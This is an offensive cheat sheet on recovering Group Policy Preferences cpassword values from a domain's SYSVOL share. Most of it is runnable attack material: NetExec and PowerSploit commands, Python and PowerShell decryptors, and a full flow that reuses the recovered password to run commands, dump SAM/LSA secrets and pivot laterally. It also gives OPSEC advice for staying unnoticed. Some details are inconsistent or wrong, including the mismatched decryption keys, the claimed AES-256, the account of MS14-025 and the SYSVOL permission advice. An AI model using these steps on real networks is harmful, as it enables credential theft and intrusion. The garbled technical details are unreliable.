# Group Policy Preferences (GPP) Stored Passwords

Extract cached domain passwords from SYSVOL. Windows stores certain Group Policy Preferences data with **cpasswd** encryption — a fixed, publicly known AES key that can be trivially decrypted.

## How It Works

```
Admin configures GPP with a password (e.g., local admin password)
  ──► XML file written to SYSVOL domain share
  ──► Password encrypted with cpasswd (static AES key)
  ──► Attacker reads SYSVOL share (authenticated or unauthenticated)
  ──► Decrypts cpasswd → plaintext password
```

## Vulnerable GPP Files

| GPP Setting | File Name |
|-------------|-----------|
| Local Administrator Password | `Groups.xml` |
| Scheduled Tasks | `ScheduledTasks.xml` |
| Drive Maps | `Drives.xml` |
| Data Sources | `DataSources.xml` |
| Printer Configuration | `Printers.xml` |
| Services | `Services.xml` |
| Custom Scripts | `Scripts.xml` |

## MS14-025 — SYSVOL Read Access

Microsoft KB 2962486 (May 2014) — Authenticated users can read SYSVOL by default. This means **any valid domain user** (including domain guests) or **null session** (in legacy configurations) can read all GPP XML files.

## Prerequisites

- Access to SYSVOL share (\\\\domain\\SYSVOL\\domain.local\\Policies\\)
- Domain account or null session (for MS14-025)
- Network connectivity to DC (TCP/445)

## Linux — NetExec GPP

### Find and decrypt GPP passwords
```bash
nxc smb 10.10.10.10 -u 'user' -p 'pass' -M gpp
```

### GPP with autodetect
```bash
nxc smb 10.10.10.10 -u 'user' -p 'pass' -M gpp_autologin
```

### Search all GPP files
```bash
nxc smb 10.10.10.10 -u 'user' -p 'pass' -M gpp -o 'DIR=\\domain.local\SYSVOL\domain.local\Policies'
```

## Linux — Manual SYSVOL Enumeration

### Mount SYSVOL and search
```bash
# Mount SYSVOL share
sudo mount -t cifs '//10.10.10.10/SYSVOL' /mnt/sysvol -o username=user,password=pass

# Find all Groups.xml
find /mnt/sysvol -name "Groups.xml" -exec cat {} \; 2>/dev/null

# Find all GPP files with passwords
find /mnt/sysvol -type f \( -name "*.xml" -o -name "*.ini" \) -exec grep -l "cpassword" {} \; 2>/dev/null
```

### Extracting cpassword from Groups.xml
```bash
find /mnt/sysvol -name "Groups.xml" -exec cat {} \;
```

Example output:
```xml
<?xml version="1.0" encoding="utf-8"?>
<Groups>
  <Group clsid="{...}" ...>
    <Properties ... localUser="Administrator" cpassword="d8Jm9Uz3QfVb6Kg2cO5e/w==" .../>
  </Group>
</Groups>
```

### Decrypting cpassword with gpp-decrypt
```bash
gpp-decrypt "d8Jm9Uz3QfVb6Kg2cO5e/w=="
```

### Using python3 directly
```bash
python3 -c "
import base64
from Crypto.Cipher import AES

cpassword = 'd8Jm9Uz3QfVb6Kg2cO5e/w=='
key = base64.b64decode('j4/5e4/W3z6Rkf3Lp2sZqA==')
iv = b'\x00' * 16
cipher = AES.new(key, AES.MODE_CBC, iv)
decoded = base64.b64decode(cpassword)
decrypted = cipher.decrypt(decoded[16:])
print('Password:', decrypted.decode('utf-16-le').rstrip('\x00'))
"
```

## Linux — pyGPP

```bash
# Parse all GPP files from a policy directory
git clone https://github.com/joeylemon/pyGPP
cd pyGPP
python3 pygpp.py /path/to/sysvol/Policies
```

## Windows — Find-GPPPasswords (PowerSploit)

```powershell
# PowerSploit: Find GPP passwords
Import-Module .\PowerView.ps1
Find-GPPPassword
```

### Manual PowerShell
```powershell
# Find Groups.xml with cpassword
$sysvol = "\\domain.local\SYSVOL\domain.local\Policies"
Get-ChildItem $sysvol -Recurse -Filter "Groups.xml" | ForEach-Object {
    $content = [xml](Get-Content $_.FullName)
    $content.Groups.Group.Properties | Where-Object { $_.cpassword } | ForEach-Object {
        Write-Output "Found: $($_.cpassword)"
    }
}
```

### Decrypt cpassword with PowerShell
```powershell
function Decrypt-Cpassword {
    param($cpassword)
    $key = [System.Text.Encoding]::UTF8.GetBytes("4e9906e8fcb66cc9faf49310620ffe8e")
    $iv = New-Object byte[] 16
    $decoded = [Convert]::FromBase64String($cpassword)
    $aes = New-Object System.Security.Cryptography.AesCryptoServiceProvider
    $aes.Key = $key
    $aes.IV = $iv
    $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $decryptor = $aes.CreateDecryptor()
    $decrypted = $decryptor.TransformFinalBlock($decoded, 0, $decoded.Length)
    [System.Text.Encoding]::UTF8.GetString($decrypted).TrimEnd("`0")
}
Decrypt-Cpassword "d8Jm9Uz3QfVb6Kg2cO5e/w=="
```

## Full Attack Flow

```
1. Authenticated SYSVOL access
   netexec smb 10.10.10.10 -u 'domain_user' -p 'any_password' -M gpp

2. If gpp module finds cpassword, it auto-decrypts
   [GPP] Found cpassword in: \\domain.local\SYSVOL\domain.local\Policies\{GUID}\Machine\Preferences\Groups\Groups.xml
   [GPP] Decrypted password: P@ssw0rd!

3. Use the password — often LOCAL ADMIN for workstations
   netexec smb 10.10.10.20 -u 'Administrator' -p 'P@ssw0rd!' -x 'whoami'

4. If local admin, dump SAM or pass-the-hash
   netexec smb 10.10.10.20 -u 'Administrator' -p 'P@ssw0rd!' --sam
   netexec smb 10.10.10.20 -u 'Administrator' -p 'P@ssw0rd!' -H <HASH> --lsa
```

## Using Without Domain Credentials (Null Session)

```bash
# Check for null session SYSVOL access (rare)
netexec smb 10.10.10.10 -u '' -p '' -M gpp

# If null session works
netexec smb 10.10.10.10 -u '' -p '' --shares
# Look for SYSVOL — accessible if MS14-025 unfixed
```

## Detection & Signatures

**Windows Event Logs:**
- **Event ID 5140** — SMB share access (SYSVOL read by non-DC)
- **Event ID 5145** — Network share object access
- **Event ID 4663** — Access to SYSVOL file
- **File creation events** — If attacker writes to SYSVOL

**Indicators:**
- Non-administrative users reading `Groups.xml` from SYSVOL
- SMB session from workstation to DC reading policy files
- Bulk read of multiple GPP XML files (automated tool behavior)
- `cpassword` attribute in XML accessed from unusual source

## OPSEC Considerations

- **Very low noise** — Reading GPO files from SYSVOL is normal domain traffic
- **Authenticated** — Requires valid credentials (or null session)
- **Old vulnerability** — Most orgs patched this in 2014+; but GPP passwords persist
- **Old GPOs** — Check old/unlinked GPOs for forgotten passwords
- **Local admin access** — The recovered password is often local admin on workstations
- **Passwords don't expire** — GPP passwords are static until the GPO is updated
- **Lateral movement** — Use recovered credentials to pivot

## Defenses

- **KB2962486 (May 2014)** — Remove `Authenticated Users` from SYSVOL read permission
  - Actual fix: Remove `Everyone` and `Authenticated Users` from SYSVOL security
  - Apply GPO to remove `Users` read access from SYSVOL

- **Delete old GPOs** — Remove any GPOs with stored cpasswords
- **Use LAPS** — Microsoft Local Administrator Password Solution (LAPS) is the proper alternative
  ```powershell
  # Check LAPS is implemented
  Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd
  ```
- **Monitor** SYSVOL file access, especially `Groups.xml`

**Scan for existing GPP passwords:**
```powershell
# Use PowerView
Get-DomainGPO | Get-DomainGPOLocalGroup | Where-Object { $_.cpassword }

# Manual search
Get-ChildItem "\\domain.local\SYSVOL\domain.local\Policies" -Recurse |
    Select-String "cpassword" | Select -ExpandProperty Path
```

## GPP Summary

| Feature | Details |
|---------|---------|
| Encryption | AES-256-CBC with static key (public since 2014) |
| Key | `4e9906e8fcb66cc9faf49310620ffe8e` |
| IV | 16 null bytes |
| Affected | GPP configured in domains prior to patch |
| Remediation | Delete GPP passwords, use LAPS |
| Detection | Easy (static key, known file paths) |
| Impact | Usually local admin credentials |

## References

- MS14-025: Vulnerability in GPP could allow elevation of privilege (KB2962486)
- GPP cpasswd encryption: https://msdn.microsoft.com/en-us/library/cc422924.aspx
- PowerSploit / PowerView: https://github.com/PowerShellMafia/PowerSploit
- pyGPP: https://github.com/joeylemon/pyGPP
- NetExec GPP module
- Check your GPP: https://github.com/outflanknl/GppAudit
